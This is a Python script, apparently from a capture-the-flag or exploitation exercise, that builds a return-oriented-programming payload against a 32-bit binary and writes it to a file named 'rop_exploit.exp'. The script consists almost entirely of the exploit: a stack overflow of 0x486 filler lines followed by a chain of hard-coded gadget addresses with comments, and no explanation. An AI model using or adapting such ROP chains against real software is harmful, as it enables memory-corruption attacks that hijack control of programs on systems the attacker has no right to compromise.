corrupt_i=b"S"*12+b"CC8"

overflow=b"a\ni\nG\na\nn\ne\ns\nh\na\n"+0x486*b"1\n"+b"A\nB\nC\nD\n"+b"\x6c\n\xa0\n\x0e\n\x08\n"

# 0x080dec61(0x080ea078)
step_init_1=b"\x61\n\xec\n\x0d\n\x08\n"+b"\x78\n\xa0\n\x0e\n\x08\n"
# 0x080b8376(0x0804e4f0)
# step_init_2="\x76\n\x83\n\x0b\n\x08\n"+"\xf0\n\xe4\n\x04\n\x08\n"
# 0x80489c0
step_init_2=b"\x76\n\x83\n\x0b\n\x08\n"+b"\xc0\n\x89\n\x04\n\x08\n"
# 0x080b82ee
step_init_3=b"\xee\n\x82\n\x0b\n\x08\n"

# 0x080dec61(0x080ea078)
step_init_4=b"\x61\n\xec\n\x0d\n\x08\n"+b"\x68\n\xa0\n\x0e\n\x08\n"
# 0x080b8376(0x0804e4f0)
step_init_5=b"\x76\n\x83\n\x0b\n\x08\n"+b"\x7c\n\xa0\n\x0e\n\x08\n"
# 0x080b82ee
step_init_6=b"\xee\n\x82\n\x0b\n\x08\n"


# 0x08048480(0x080EA01A)
step_0=b"\x80\n\x84\n\x04\n\x08\n"+b"\x78\n\xa0\n\x0e\n\x08\n"
# 0x08049533
step_1=b"\x33\n\x95\n\x04\n\x08\n"
# 0x0807abaf
step_2=b"\xaf\n\xab\n\x07\n\x08\n"
# 0x080dec61(0x080eba20)
step_3=b"\x61\n\xec\n\x0d\n\x08\n"+b"\x20\n\xba\n\x0e\n\x08\n"
# 0x08084818
step_4=b"\x18\n\x48\n\x08\n\x08\n"
# 0x080632c7(dummy)
step_5=b"\xc7\n\x32\n\x06\n\x08\n"+b"A\nA\nA\nA\n"
# 0x08084818
step_6=b"\x18\n\x48\n\x08\n\x08\n"
# 0x080632c7(dummy)
step_7=b"\xc7\n\x32\n\x06\n\x08\n"+b"A\nA\nA\nA\n"
# 0x08084818
step_8=b"\x18\n\x48\n\x08\n\x08\n"
# 0x080632c7(dummy)
step_9=b"\xc7\n\x32\n\x06\n\x08\n"+b"A\nA\nA\nA\n"
# 0x08084818
step_10=b"\x18\n\x48\n\x08\n\x08\n"
# 0x080632c7(dummy)
step_11=b"\xc7\n\x32\n\x06\n\x08\n"+b"A\nA\nA\nA\n"
# 0x08084818
step_12=b"\x18\n\x48\n\x08\n\x08\n"
# 0x080632c7(dummy)
step_13=b"\xc7\n\x32\n\x06\n\x08\n"+b"A\nA\nA\nA\n"
# 0x08084818
step_14=b"\x18\n\x48\n\x08\n\x08\n"
# 0x080632c7(dummy)
step_15=b"\xc7\n\x32\n\x06\n\x08\n"+b"A\nA\nA\nA\n"
# 0x080b82ee
# step_16="\xee\n\x82\n\x0b\n\x08\n"
# 0x0804ee60(0x080bb573, 0x080eba20)->0x0804e4f0
# step_17="\x60\n\xee\n\x04\n\x08\n"
# step_18="\xf0\n\xe4\n\x04\n\x08\n"+"\x73\n\xb5\n\x0b\n\x08\n"+"\x20\n\xba\n\x0e\n\x08\n"
# stop loop

# 0x080dec61(0x080ea078)
# step_16="\x61\xec\x0d\x08"+"\x7c\xa0\x0e\x08"
# 0x080489a5
step_17=b"\xa5\n\x89\n\x04\n\x08\n"


step_19=b"1"*12+b"\x09\x00\x00\x00\x00\n1\n"

# payload=corrupt_i+overflow+step_0+step_1+step_2+step_3+step_4+step_5+step_6+step_7+step_8+step_9+step_10+step_11+step_12+step_13+step_14+step_15+step_16+step_17+step_18+step_19
payload=corrupt_i+overflow+step_init_1+step_init_2+step_init_3+step_init_4+step_init_5+step_init_6+step_0+step_1+step_2+step_3+step_4+step_5+step_6+step_7+step_8+step_9+step_10+step_11+step_12+step_13+step_14+step_15+step_17+step_19


# print(payload)

exp_file_name="rop_exploit.exp"
exp_out = open(exp_file_name,'wb')
exp_out.write(payload)
exp_out.close()

# 0x0804e4f0 exit

